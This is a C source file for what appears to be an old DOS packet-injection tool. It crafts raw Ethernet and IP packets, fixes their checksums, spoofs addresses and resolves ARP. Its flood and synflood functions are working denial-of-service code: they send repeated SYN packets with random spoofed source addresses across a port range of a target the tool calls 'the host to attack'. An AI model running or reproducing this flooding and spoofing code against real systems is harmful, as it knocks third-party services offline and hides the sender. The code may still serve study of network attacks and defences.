
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <dos.h>

#include "inject.h"
#include "pktdrvr.h"
#include "parse.h"
#include "netool.h"


extern char volatile myetheraddr[6];
extern char volatile toetheraddr[6];
extern char myipaddr[4];
extern char toipaddr[4];
unsigned char tempip[4];
extern int intno;
extern int llen; /* dod */
int volatile gotarp;

int id=2718;

FILE * frl;

unsigned int in_cksum(unsigned char * addr,unsigned len)
{
	unsigned nleft=len;
	unsigned int *w=(unsigned int *) addr;
	unsigned long sum=0;
	unsigned int answer=0;

	while (nleft>1)
	{
		sum += *(w++);
		nleft -= 2;
	}
	if (nleft==1)
	{
		*(unsigned char *)(&answer)=*(unsigned char *)w; /* ? */
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer=~sum;
	return(answer);
}

void inject(void)
{
	FILE * f;
	char b[2500];
	int size;

	if (! ( f=fopen( getvar("infile"), "rb" ) ) )
	{
		cprintf("Cannot open file in variabile infile:%s\n\r",
			getvar("infile") );
		return;
	}
	size=fread(b,1,2500,f);
	fclose(f);
	dopkt(b,size);
}

void putipchecksum(unsigned char * packet, unsigned len)
{
	unsigned checksum,hsize,psize,sum;
	unsigned char * p;

	hsize=(packet[14] & 0x0f) << 2;
	packet[24]=0;
	packet[25]=0;
	checksum=in_cksum(packet+14,hsize);
	packet[25]=(checksum >> 8);
	packet[24]=(checksum & 0xff);
	psize=len-hsize-14;
	p=packet+len;
	switch (packet[23])
	{
		case 6:		/* TCP */
			{
				packet[14+hsize+16]=0;
				packet[14+hsize+17]=0;
				if ( (len&1) )
				{
					*p++=0;
				}
				memcpy(p,14+packet+12,4);
				p+=4;
				memcpy(p,14+packet+16,4);
				p+=4;
				*p++=0;
				*p++=packet[14+9];
				*p++=psize >> 8;
				*p++=psize & 0xff;
				sum=in_cksum(packet+hsize+14,p-packet-hsize-14);
				if (!sum) sum=0xffff;
				packet[14+hsize+17]= (sum >> 8);
				packet[14+hsize+16]= (sum & 0xff);
				break;
			}
		case 17:        /* UDP */
			{
				packet[14+hsize+6]=0;
				packet[14+hsize+7]=0;
				if ( (len&1) )
				{
					*p++=0;
				}
				memcpy(p,14+packet+12,4);
				p+=4;
				memcpy(p,14+packet+16,4);
				p+=4;
				*p++=0;
				*p++=packet[14+9];
				*p++=psize >> 8;
				*p++=psize & 0xff;
				sum=in_cksum(packet+hsize+14,p-packet-hsize-14);
				if (!sum) sum=0xffff;
				packet[14+hsize+7]= (sum >> 8);
				packet[14+hsize+6]= (sum & 0xff);
				break;
			}
	}

}


void injectip(void)
{
	FILE * f;
	unsigned char b[2500];
	int size;
	unsigned int portno,hsize;

	if (! ( f=fopen( getvar("infile"), "rb" ) ) )
	{
		cprintf("Cannot open file in variabile infile:%s\n\r",
			getvar("infile") );
		return;
	}
	size=fread(b,1,2500,f);
	fclose(f);
	if (getvar("fillipfrom"))
	{
		memcpy(b+26,myipaddr,4);
	}
	if (getvar("fillipto"))
	{
		memcpy(b+30,toipaddr,4);
	}
	hsize=(b[14] & 0x0f) << 2;
	b[18]=random(256);	/* randomize id */
	b[19]=random(256);
	switch (b[23])
	{
		case 6:
		{
			if (getvar("portfrom"))
			{
			   portno=atoi(getvar("portfrom"));
			   b[14+hsize]=portno>>8;
			   b[14+hsize+1]=(portno & 0xff);
			}
			if (getvar("portto"))
			{
			   portno=atoi(getvar("portto"));
			   b[14+hsize+2]=portno>>8;
			   b[14+hsize+3]=(portno & 0xff);
			}
			break;
		}
		case 17:
		{
			if (getvar("portfrom"))
			{
			   portno=atoi(getvar("portfrom"));
			   b[14+hsize]=portno>>8;
			   b[14+hsize+1]=(portno & 0xff);
			}
			if (getvar("portto"))
			{
			   portno=atoi(getvar("portto"));
			   b[14+hsize+2]=portno>>8;
			   b[14+hsize+3]=(portno & 0xff);
			}
			break;
		}
	}
	putipchecksum(b,size);
	dopkt(b,size);

}


int dopkt(char * what, int hm)
{
	if (getvar("fillethfrom"))	/* fill our ethernet adress */
	{
		 memcpy(what+6,myetheraddr,6);
	}
	if (getvar("fillethto")) /* fill to ethernet adress */
	{
		 memcpy(what,toetheraddr,6);
	}
	return send_pkt(intno,what,hm);
}

void rlhook(unsigned char * b, int l, struct netpacket * n)
{
	int j;

	n=n;			/* avoid warning */
	fprintf(frl,"\n");
	for (j=0;j<l;j++)
	{
		if ( (j%25)==0 )
		{
			fprintf(frl,"\n%4i:",j);
		}
		fprintf(frl,"%2X ",b[j]);
	}
}

void arphook(unsigned char * b, int l, struct netpacket * n)
{
	b=b;	/* no warn */
	l=l;	/* no warn */
	if ((n->type==ARP) && (n->proto!=1) && (!memcmp(tempip,n->ipto,4)) )
	 {
		memcpy(myetheraddr,n->etharp,6);
		gotarp=1;
	 }
}

void arphookto(unsigned char * b, int l, struct netpacket * n)
{
	b=b;	/* no warn */
	l=l;	/* no warn */
	if ((n->type==ARP) && (n->proto!=1) && (!memcmp(tempip,n->ipto,4)))
	 {
		memcpy(toetheraddr,n->etharp,6);
		gotarp=1;
	 }
}


void rawlog(void)
{
	cputs("raw logging in RAW.LOG\n\r");
	cputs("press a key to end!\n\r");
	frl=fopen("raw.log","a");
	hookfun=rlhook;
	ishooked=1;
	while (kbhit());
	ishooked=0;
	sleep(1);
	fclose(frl);
	cputs("raw logging ended\n\r");
}

void catcharp(void)
{
	FILE * a;
	char buff[45];
	int size;
	int ip1,ip2,ip3,ip4;

	if (! ( a=fopen("ARP.DAT", "rb" ) ) )	/* ARP data packet */
	{
		cprintf("Cannot open file ARP.DAT\n\r");
		return;
	}
	size=fread(buff,1,44,a);
	fclose(a);
	if (!(getvar("arpip")))
	{
		cprintf("No IP Defined! Set variable arpip\n\r");
		return;
	}
	ip1=ip2=ip3=ip4=0;
	if ((getvar("myarpip")))
	{
		sscanf(getvar("myarpip"),"%u.%u.%u.%u",&ip1,&ip2,&ip3,&ip4);
		buff[28]=ip1;
		buff[29]=ip2; /* fill from IP */
		buff[30]=ip3;
		buff[31]=ip4;
	}
	 else
	cprintf("The myarpip var defines the IP from of the request\n\r");
	sscanf(getvar("arpip"),"%u.%u.%u.%u",&ip1,&ip2,&ip3,&ip4);
	buff[38]=tempip[0]=ip1;
	buff[39]=tempip[1]=ip2;   /* fill with desired ip */
	buff[40]=tempip[2]=ip3;
	buff[41]=tempip[3]=ip4;
	dopkt(buff,size);
}


void getarp(void)
{
	gotarp=0;
	hookfun=arphook;
	ishooked=1;
	catcharp();
	sleep(2);
	ishooked=0;
	if (gotarp==1)
	  {
		cprintf("Source ethernet adress got succesfully\n\r");
		gotarp=0;
	  }
	else
		cprintf("Source ethernet adress not set\n\r");
}

void getarpto(void)
{
	gotarp=0;
	hookfun=arphookto;
	ishooked=1;
	catcharp();
	sleep(2);
	ishooked=0;
	if (gotarp==1)
	  {
		cprintf("Destination ethernet adress got succesfully\n\r");
		gotarp=0;
	  }
	else
		cprintf("Destination ethernet adress not set\n\r");
}


void flood(void)
{
	int flud,temp;

	if (getvar("pktnumber")==NULL)
		cprintf("You must set the pktnumber variable first\n\r");
	else
	{
	if (getvar("infile")==NULL)
		cprintf("You must set the infile variable first\n\r");
	  else
	   {
		temp=(atoi(getvar("pktnumber")));
		for (flud=0;flud<temp;flud++)
		inject();
	   }
	}
}

void synflood(void)
{

	FILE * a;
	char buff[300];
	unsigned int cnt,packets,porta,porta2;
	unsigned int fromport,toport, ip1, ip2, ip3, ip4;
	int size;

	if (! ( a=fopen("SYN.DAT", "rb" ) ) )	/* SYN data packet */
	{
		cprintf("Cannot open file SYN.DAT\n\r");
		return;
	}
	size=fread(buff,1,59,a);
	fclose(a);
	if (getvar("synip")==NULL)
	{
		cprintf("You must define the IP of the host to attack in the variable synip\n\r");
		return;
	}
	sscanf(getvar("synip"),"%u.%u.%u.%u",&ip1,&ip2,&ip3,&ip4);
	buff[30]=ip1;
	buff[31]=ip2;   /* fill with desired destination IP */
	buff[32]=ip3;
	buff[33]=ip4;

	if (getvar("synportfrom")==NULL)	/* SYN start port */
	{
		cprintf("You must define the start port synportfrom\n\r");
		return;
	}
	if (getvar("synportto")==NULL)	/* SYN end port */
	{
		cprintf("You must define the end port synportto\n\r");
		return;
	}
	fromport=atoi(getvar("synportfrom"));
	toport=atoi(getvar("synportto"));
	if (fromport > toport)
	{
		cprintf("fromport must be greater than toport\n\r");
		return;
	}
	if (getvar("synpkt")==NULL)
	    cprintf("You must set the synpkt variable first (number of packets)\n\r");
	 else
	 {
	  packets=atoi(getvar("synpkt"));
	  for (cnt=0;cnt<packets;cnt++)
	  {
	     for (porta=fromport;porta<toport;porta++)
		{
		      porta2=1024+random(500);
		      buff[29]=random(255);	/* a random IP */
		      buff[28]=random(255);
		      buff[27]=random(255);
		      buff[26]=random(50)+100;
		      buff[34]=porta2>>8;      	/* from port */
		      buff[35]=(porta2 & 0xff);
		      buff[36]=porta>>8;	/* to port */
		      buff[37]=(porta & 0xff);
		      putipchecksum(buff,size); /* calculate checksum */
		      dopkt(buff,size);		/* send the packet */
		      delay(100);		/* little pause */
		}
	  }
	 }

}